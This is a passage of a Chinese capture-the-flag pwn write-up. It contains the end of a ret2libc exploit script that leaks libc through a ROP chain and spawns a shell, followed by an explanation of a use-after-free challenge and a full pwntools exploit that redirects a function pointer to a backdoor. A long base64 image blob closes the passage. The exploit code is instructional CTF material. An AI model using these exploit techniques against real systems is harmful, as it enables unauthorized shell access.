N = 94576960329497431
p = 261571747
q = 361571773
phi = (p-1)*(q-1)
d = 26375682325297625

def powmod(a, b, m):
	if a == 0:
		return 0
	if b == 0:
		return 1
	res = powmod(a,b//2,m)
	res *= res
	res %= m
	if b&1:
		res *= a
		res %= m
	return res

def ans(sh):
	sh.recvuntil("it\n")
	for _ in range(20):
		c = int(sh.recvline())
		m = powmod(c, d, N)
		sh.sendline(str(m))
		sh.recvline()

def leak(sh, addr, presize):
	sh.recvuntil("name:\n")
	payload = flat(b'a' * presize, p64(pop_rdi_addr), p64(addr), p64(elf.plt['puts']), p64(vlun_addr))
	sh.sendline(payload)
	leaked = sh.recvuntil('\n')[:-1]
	while len(leaked) < 8:
		leaked += b'\x00'
	return u64(leaked)

sh = remote('127.0.0.1', '8888')
ans(sh)
libc_main_addr = leak(sh, elf.got['__libc_start_main'], 72)
print("WE GOT LIBC_MAIN_ADDR")
print(hex(libc_main_addr))

obj = LibcSearcher("__libc_start_main", libc_main_addr)
libc_main_offset = obj.dump('__libc_start_main')
system_offset = obj.dump('system')
sh_offset = obj.dump('str_bin_sh')

base_addr = libc_main_addr - libc_main_offset
system_addr = system_offset + base_addr
sh_addr = sh_offset + base_addr

payload = flat(b'a' * 72, p64(pop_rdi_addr), p64(sh_addr), p64(system_addr))
sh.sendline(payload)

sh.interactive()
```


## 0x08 YDSneedGirlfriend

本次比赛的唯一一道堆题,改编自hitcon training的uaf,这道题是我当初学习pwn堆题的第一题,非常简单,因此出本题是希望18,19级同学能有所收获,没想到本校没人做出QAQ

**考点:uaf**

漏洞位置:

```
unsigned __int64 del_girlfriend()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, &buf, 4uLL);
  v1 = atoi(&buf);
  if ( v1 >= 0 && v1 < count )
  {
    if ( girlfriendlist[v1] )
    {
      free(*((void **)girlfriendlist[v1] + 1));
      free(girlfriendlist[v1]);
      puts("Success");
    }
  }
  else
  {
    puts("Out of bound!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

可以看到我们在free一个chunk的时候并未给这个chunk置NULL,从而导致UAF漏洞的发生

通过逆向可以看出girlfriend结构体为:

```
struct girlfriend {
	void (*func)();
	char *buf ;
};
```

func的作用就是打印名字

并且程序给出了后门函数backdoor,我们只需要利用uaf漏洞将func原本指向的函数指向backdoor函数,之后调用即可

payload如下:

```
from pwn import *

p=process('./girlfriend2')
#p=remote('222.186.56.247',8131)
elf=ELF('./girlfriend')

#context.terminal=['tmux','splitw','w']
backdoor=elf.symbols['backdoor']
sys=elf.symbols['system']

def add(size,name):
    p.recvuntil(':')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(str(size))
    p.recvuntil(':')
    p.sendline(name)

def dele(index):
    p.recvuntil(':')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(str(index))

def prin(index):
    p.recvuntil(':')
    p.sendline('3')
    p.recvuntil(':')
    p.sendline(str(index))

add(32,'aaa')
add(32,'bbb')
add(32,'ccc')

dele(0)
dele(1)

add(24,p64(backdoor))

prin(0)
p.interactive()
```



[modtogether]:data:image/jpeg;base64,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